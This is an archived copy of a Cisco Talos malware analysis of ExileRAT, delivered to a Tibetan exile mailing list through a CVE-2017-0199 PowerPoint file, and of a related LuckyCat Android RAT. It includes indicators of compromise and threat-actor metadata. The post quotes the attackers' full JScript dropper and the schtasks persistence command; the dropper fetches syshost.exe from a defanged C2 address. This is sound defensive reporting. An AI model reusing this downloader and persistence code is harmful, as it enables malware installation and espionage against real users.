{
    "id": "5bc40732-9c8f-4876-b51a-6c17ee46d9d6",
    "created_at": "2023-01-12T15:04:51.407643Z",
    "updated_at": "2025-03-27T02:06:12.709646Z",
    "deleted_at": null,
    "sha1_hash": "e619fa9d7a9c66c68052d90613d75f9cbf6e4ab8",
    "title": "2019-02-04 - ExileRAT shares C2 with LuckyCat, targets Tibet",
    "authors": "",
    "file_creation_date": "2022-05-28T15:55:41Z",
    "file_modification_date": "2022-05-28T15:55:41Z",
    "file_size": 1565823,
    "plain_text": "# ExileRAT shares C2 with LuckyCat, targets Tibet\n\n**blog.talosintelligence.com/2019/02/exilerat-shares-c2-with-luckycat.html**\n\n_[Warren Mercer,](https://twitter.com/securitybeard)_ _[Paul Rascagneres and](https://twitter.com/r00tbsd)_ _[Jaeson Schultz authored this post.](https://twitter.com/jaesonschultz)_\n\n## Executive summary\n\nCisco Talos recently observed a malware campaign delivering a malicious Microsoft PowerPoint document using a mailing list run by the\n[Central Tibetan Administration (CTA), an organization officially representing the Tibetan government-in-exile. The document used in the attack](https://tibet.net/)\nwas a PPSX file, a file format used to deliver a non-editable slideshow derived from a Microsoft PowerPoint document. In our case, we\nreceived an email message from the CTA mailing list containing an attachment, \"Tibet-was-never-a-part-of-China.ppsx,\" meant to attack\nsubscribers of this Tibetan news mailing list. Given the nature of this malware and the targets involved, it is likely designed for espionage\npurposes rather than financial gain. This is just part of a continuing trend of nation-state actors working to spy on civilian populations for\npolitical reasons.\n\n\n-----\n\n## Malicious Office document\n\nOnce we began analysis on this document, we discovered additional campaigns that shared infrastructure and payloads. The infrastructure\nused for the command and control (C2) in this campaign has been previously linked to the LuckyCat Android- and Windows-based trojans. The\ndiscovery of the C2 led us to identify multiple campaigns being hosted on the C2 using the same payloads, configurations and more. The\nmalicious PPSX file was used as the dropper to allow the attacker to execute various JavaScript scripts to download the payload.\n\nThe PPSX document sent to the CTA mailing list looked like this:\n\n[Everyone on the CTA's mailing list received this email. The mailing list's infrastructure is run out of DearMail, an India-based company that bills](http://www.dearmail.in/)\nitself as a \"powerful cloud enabled web-based email campaign manager.\" The attackers modified the standard Reply-To header normally used\nby the CTA mailings so that any responses would be directed back to an email address belonging to the attackers: mediabureauin [at]\ngmail.com.\n\nThe email message itself references the upcoming 60th anniversary of the Dalai Lama's exile on March 31. The document is a large slide\nshow, over 240 slides in length, claimed to have been created by the Central Tibetan Administration.\n\nThis PPSX is actually a copy of a legitimate PDF available for download from the tibet.net homepage from the Central Tibetan Administration\n[here. The slideshow's file name, \"Tibet-was-never-a-part-of-China,\" is identical to a legitimate PDF published November 1, 2018, which](https://tibet.net/wp-content/uploads/2019/01/Tibet-was-never-a-part-of-China.pdf)\ndemonstrates the attacker moved quickly to abuse this.\n\n[This attack abuses CVE-2017-0199, an arbitrary code execution vulnerability in Microsoft Office. The exploit originated from a public script](https://blog.talosintelligence.com/2017/04/cve-2017-0199.html)\n[available on GitHub. The code resides in the \"slide1.xml.rels\" file. The best method for accessing these files is to unzip/inflate the PPSX file to](https://github.com/bhdresh/CVE-2017-0199)\nsee the contents of the entire document. This file is in the \"/ppt/slides/_rels\" folder.\n\nThis command decodes as \"script:hXXp:\\\\27.126.188[.]212:8005\\aqqee\" — it is currently URL encoded.\n\n\n-----\n\ne sa e sc pt ca be ou d abus g t e app e o e e, ote t e co ect po t u be used s sc pt does ot actua y e ecute\nand there is no request to TCP port 8003.\n\n[We see this script while running dynamic analysis on Threat Grid.](https://www.cisco.com/c/en/us/products/security/threat-grid/index.html)\n\nThe PPSX also attempts to contact iplocation to perform some geo-location lookups.\n\nThis will carry out an HTTP request to the C2 server, specifically for a resource \"aqqee.\" Within the response body, we see a faked HTTP\nresponse date \"Sun 16 Apr 2017\".\n\nThe C2 then delivers a JavaScript script that's responsible for downloading the payload \"syshost.exe\" from the C2.\n\nThis is then executed via WScript while also utilizing cmd.exe to create a scheduled task called \"Diagnostic_System_Host.\"\n\n_<script language='JScript'>_\n_<![CDATA[_\n_function getTempPath(){var wshshell=new ActiveXObject('WScript.Shell');var_\n_TempPath=wshshell.SpecialFolders('AppData');TempPath+='\\\\';return TempPath;};var filepath=getTempPath()+'syshost.exe';function_\n_DownURL(strRemoteURL, strLocalURL){var xmlHTTP = new_\n_ActiveXObject(\"Microsoft.XMLHTTP\");xmlHTTP.open(\"Get\",strRemoteURL,false);xmlHTTP.send();var adodbStream = new_\n_ActiveXObject(\"ADODB.Stream\");adodbStream.Type =_\n_1;adodbStream.Open();adodbStream.write(xmlHTTP.responseBody);adodbStream.SaveToFile(strLocalURL,2);adodbStream.Close();adodbSt_\n_= null;xmlHTTP = null;};DownURL(\"hXXp://27.126.188[.]212/2/syshost.exe\",filepath);function execShell(cmdstr){var oS = new_\n_ActiveXObject('WScript.Shell');var shellcmd = 'cmd.exe /c '+cmdstr;var o = oS.Run(shellcmd,0,false);};execShell('schtasks \\/create \\/sc_\n_minute \\/mo 1 \\/tn Diagnostic_System_Host \\/tr '+filepath);_\n_]]>_\n_</script>_\n\nThe scheduled task is created using the following command line input via cmd.exe, the name used is \"Diagnostic_System_Host\" which is very\nsimilar to the legitimate system task name \"Diagnostic System Host\" without the \"_\" (underscores) — a clear attempt by the adversary to avoid\ndetection.\n\n\"C:\\Windows\\System32\\cmd.exe\" /c schtasks /create /sc minute /mo 1 /tn Diagnostic_System_Host /tr\nC:\\Users\\Administrator\\AppData\\Roaming\\syshost.exe\n\n## ExileRAT malware: Syshost.exe\n\n\n-----\n\nThe infected system is now running syshost.exe, a.k.a. ExileRAT, served from the attackers C2. The compilation date matches the campaign\ntimeframe: Jan 30 07:05:47 2019 UTC.\n\nOne of the first steps carried out by ExileRAT is to perform an IP location lookup and write that data to a c:\\data.ini file.\n\nWe can identify this easily within the PE:\n\nThe C2 platform is hardcoded within the PE as well:\n\nExileRAT is a simple RAT platform capable of getting information on the system (computer name, username, listing drives, network adapter,\nprocess name), getting/pushing files and executing/terminating processes.\n\n## C2 infrastructure\n\nThe C2 used in this campaign was \"27.126.188.212.\" We identified several open directories that contained other .exe and .dll files, namely\n\"AcroRd32.exe\" and \"ccL100U.dll.\" These files were available under \"/1\" on the C2, whereas the Tibet campaign PPSX used /2. It's common\nfor threat actors to re-use infrastructure to make the campaigns more visible. This is most likely the case here, as we identified a log file\n\"robins.log\" contained in the directories that were seemingly being used to identify new requests to TCP 8005.\n\nDuring our analysis of the C2, we were able to identify several domains also using this IP, namely mondaynews[.]tk, peopleoffreeworld[.]tk and\ngmailcom[.]tw. The attackers likely registered this last domain to mimic Google in the hopes of tricking users during phishing campaigns.\n\n## LuckyCat Android RAT\n\nThe hardcoded C2 server IP in Syshost.exe was also recently home to a specific interesting domain: mondaynews[.]tk. This domain is the C2\ndomain of an Android RAT created on Jan. 3. This is a newer version of the LuckyCat Android RAT used in 2012 against Tibetan activists. In\nthose attacks, malicious actors targeted pro-Tibetan sympathizers. This newer version includes the same features as the 2012 version (file\nuploading, downloading, information stealing and remote shell) and adds several new features, including file removing, app execution, audio\nrecording, personal contact stealing, SMS stealing, recent call stealing and location stealing. You can see the command type class from 2012\n(left) and from 2019 (right):\n\n\n-----\n\nSeveral of these features between the two versions share the same name, and many are even copied-and-pasted:\n\nThe Baidu map API is also included in the app:\n\nThe malware checks if the app has root access on the Android device, and if it does, the application modifies the permission of a specific\ndirectory — /data/data/com.tencent.mm/:\n\nIn this directory, we can find the encryption keys of the chat application WeChat (developed by Chinese tech company Tencent). Due to the\nespionage nature of the LuckyCat Android RAT and the victimology, we conclude that the malware modifies the permissions to allow the\nattacker to retrieve these keys and decrypt the chat messages. The malware will perform a \"chmod 777\" on the Tencent directory as seen in\nthe code above. This is carried out to allow the malware to be able to access this specific directory and obtain files, keys and other data from it.\nThe attacker is then able to exfiltrate this information by using the \"upload\" command within the malware.\n\n## Conclusion\n\n\n-----\n\nThis attack was yet another evolution in a series of attacks targeting a constituency of political supporters, and further evidence that not all\n[attacks require the use of zero-day vulnerabilities. For example, an attack we called \"Persian Stalker\" in November utilized vulnerabilities in](https://blog.talosintelligence.com/2018/11/persian-stalker.html)\nsecure messaging apps to steal messages that users thought were private. A separate attack in India last year also targeted mobile devices,\nthis time through the use of [malicious mobile device management (MDM) software. This PPSX document was using the CVE-2017-0199](https://blog.talosintelligence.com/2018/07/Mobile-Malware-Campaign-uses-Malicious-MDM.html)\nvulnerability to force a victim to download an additional payload. Clearly, the defensive best-practice of patching systems against known\nvulnerabilities continues to be critical and can help insulate organizations against these kinds of attacks. These specific attacks are most likely\naimed at espionage as opposed to financial gain. Having stopped this attack quickly, we hope that the disruption caused by Cisco Talos will\nensure the adversary must regroup.\n\n## Coverage\n\nAdditional ways our customers can detect and block this threat are listed below.\n\n[Advanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware used by these threat actors. Below is a](https://www.cisco.com/c/en/us/products/security/advanced-malware-protection)\nscreenshot showing how AMP can protect customers from this threat.\n\n[Cisco Cloud Web Security (CWS) or](https://www.cisco.com/c/en/us/products/security/cloud-web-security/index.html) [Web Security Appliance (WSA) web scanning prevents access to malicious websites and detects](https://www.cisco.com/c/en/us/products/security/web-security-appliance/index.html)\nmalware used in these attacks.\n\n[Email Security can block malicious emails sent by threat actors as part of their campaign.](https://www.cisco.com/c/en/us/products/security/email-security-appliance/index.html)\n\n[Network Security appliances such as Next-Generation Firewall (NGFW),](https://www.cisco.com/c/en/us/products/security/firewalls/index.html) [Next-Generation Intrusion Prevention System (NGIPS), and](https://www.cisco.com/c/en/us/products/security/intrusion-prevention-system-ips/index.html) Meraki\nMX can detect malicious activity associated with this threat.\n\n[AMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security products.](https://www.cisco.com/c/en/us/solutions/enterprise-networks/amp-threat-grid/index.html)\n\n[Umbrella, our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off](https://umbrella.cisco.com/)\nthe corporate network.\n\nOpen Source SNORTⓇ Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on\n[Snort.org.](https://www.snort.org/products)\n\n## Indicators of Compromise (IOCs)\n\nThe following IOCs are associated to this campaign:\n\n### Malicious Office Document\n\n[742d1178d20d2fbeea506544f0525b8182d1273d4bf58db48921db6a542871aa (SHA256)](https://panacea.threatgrid.com/mask/samples/6aceaf986440bd062b471679a6845686)\n\n### PE32 ExileRAT\n\n3eb026d8b778716231a07b3dbbdc99e2d3a635b1956de8a1e6efc659330e52de (SHA256)\n\n### LuckyCat Android RAT\n\n9498ddbfe296e98376187be67b768f3ba053a7cbdffeeda61e28c40bd21365f0 - 2019 (SHA256)\n\n74e79c89a63d030ad0c0f545e79ac8f4b7910387d0d294ff9fdca91c486efcf8 - 2012 (SHA256)\n\n### C2 server\n\n\n-----\n\n6 88[ ]\nmondaynews[.]tk\npeopleoffreeworld[.]tk\ngmailcom[.]tw\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-02-04 - ExileRAT shares C2 with LuckyCat, targets Tibet.pdf"
    ],
    "report_names": [
        "2019-02-04 - ExileRAT shares C2 with LuckyCat, targets Tibet.pdf"
    ],
    "threat_actors": [
        {
            "id": "1a651080-cb2f-49bb-87cb-b9c6f6f99ce9",
            "created_at": "2022-10-25T16:07:23.809467Z",
            "updated_at": "2025-03-27T02:02:09.988548Z",
            "deleted_at": null,
            "main_name": "Lucky Cat",
            "aliases": [],
            "source_name": "ETDA:Lucky Cat",
            "tools": [
                "Comfoo",
                "Comfoo RAT",
                "Lucky Cat",
                "LuckyCat",
                "Sojax",
                "Syndicasec",
                "WMI Ghost",
                "Wimmie"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "9792e41f-4165-474b-99fa-e74ec332bd87",
            "created_at": "2023-01-06T13:46:38.986789Z",
            "updated_at": "2025-03-27T02:00:02.970288Z",
            "deleted_at": null,
            "main_name": "Lucky Cat",
            "aliases": [
                "White Dev 9",
                "TA413"
            ],
            "source_name": "MISPGALAXY:Lucky Cat",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "99cb4e5b-8071-4f9e-aa1d-45bfbb6197e3",
            "created_at": "2023-01-06T13:46:38.860754Z",
            "updated_at": "2025-03-27T02:00:02.937438Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "SectorJ04 Group",
                "Dudear",
                "G0092",
                "ATK103",
                "Hive0065",
                "Spandex Tempest",
                "GRACEFUL SPIDER",
                "GOLD TAHOE",
                "CHIMBORAZO",
                "SectorJ04"
            ],
            "source_name": "MISPGALAXY:TA505",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "75d4d6a9-b5d1-4087-a7a0-e4a9587c45f4",
            "created_at": "2022-10-25T15:50:23.5188Z",
            "updated_at": "2025-03-27T02:00:55.489882Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "TA505",
                "Hive0065",
                "Spandex Tempest",
                "CHIMBORAZO"
            ],
            "source_name": "MITRE:TA505",
            "tools": [
                "AdFind",
                "Azorult",
                "FlawedAmmyy",
                "Mimikatz",
                "Dridex",
                "TrickBot",
                "Get2",
                "FlawedGrace",
                "Cobalt Strike",
                "ServHelper",
                "Amadey",
                "SDBbot",
                "PowerSploit"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "e447d393-c259-46e2-9932-19be2ba67149",
            "created_at": "2022-10-25T16:07:24.28282Z",
            "updated_at": "2025-03-27T02:02:10.159466Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "ATK 103",
                "Chimborazo",
                "Gold Evergreen",
                "Gold Tahoe",
                "Graceful Spider",
                "Hive0065",
                "Operation Tovar",
                "Operation Trident Breach",
                "SectorJ04",
                "Spandex Tempest",
                "TA505",
                "TEMP.Warlock"
            ],
            "source_name": "ETDA:TA505",
            "tools": [
                "Amadey",
                "AmmyyRAT",
                "AndroMut",
                "Azer",
                "Bart",
                "Bugat v5",
                "CryptFile2",
                "CryptoLocker",
                "CryptoMix",
                "CryptoShield",
                "Dridex",
                "Dudear",
                "EmailStealer",
                "FRIENDSPEAK",
                "Fake Globe",
                "Fareit",
                "FlawedAmmyy",
                "FlawedGrace",
                "FlowerPippi",
                "GOZ",
                "GameOver Zeus",
                "GazGolder",
                "Gelup",
                "Get2",
                "GetandGo",
                "GlobeImposter",
                "Gorhax",
                "GraceWire",
                "Gussdoor",
                "Jaff",
                "Kasidet",
                "Kegotip",
                "Kneber",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Locky",
                "MINEBRIDGE",
                "MINEBRIDGE RAT",
                "MirrorBlast",
                "Neutrino Bot",
                "Neutrino Exploit Kit",
                "P2P Zeus",
                "Peer-to-Peer Zeus",
                "Philadelphia",
                "Philadephia Ransom",
                "Pony Loader",
                "Rakhni",
                "ReflectiveGnome",
                "Remote Manipulator System",
                "RockLoader",
                "RuRAT",
                "SDBbot",
                "ServHelper",
                "Shifu",
                "Siplog",
                "TeslaGun",
                "TiniMet",
                "TinyMet",
                "Trojan.Zbot",
                "Wsnpoem",
                "Zbot",
                "Zeta",
                "ZeuS",
                "Zeus"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535891,
    "ts_updated_at": 1743041172,
    "ts_creation_date": 1653753341,
    "ts_modification_date": 1653753341,
    "files": {
        "pdf": "https://archive.orkl.eu/e619fa9d7a9c66c68052d90613d75f9cbf6e4ab8.pdf",
        "text": "https://archive.orkl.eu/e619fa9d7a9c66c68052d90613d75f9cbf6e4ab8.txt",
        "img": "https://archive.orkl.eu/e619fa9d7a9c66c68052d90613d75f9cbf6e4ab8.jpg"
    }
}